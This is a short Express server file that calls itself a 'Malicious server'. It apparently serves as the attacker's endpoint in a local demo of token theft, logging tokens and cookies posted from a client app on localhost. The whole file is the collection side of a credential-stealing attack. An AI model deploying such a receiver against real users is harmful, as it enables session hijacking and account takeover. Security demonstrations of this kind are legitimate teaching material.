const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const app = express();
const PORT = 4001;
const cors = require('cors');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.use(cors({credentials:true,origin:'http://localhost:3001'}));

app.post(`/api/token`, (req, res) => {
  console.log('TOKENS retrieved from client:',req.body);
  console.log('Cookies recieved:',req.cookies)
  res.status(200).send('')
})


app.listen(PORT, err => {
  if (err) throw err
  console.log(`Malicious server ready on http://localhost:${PORT}`)
})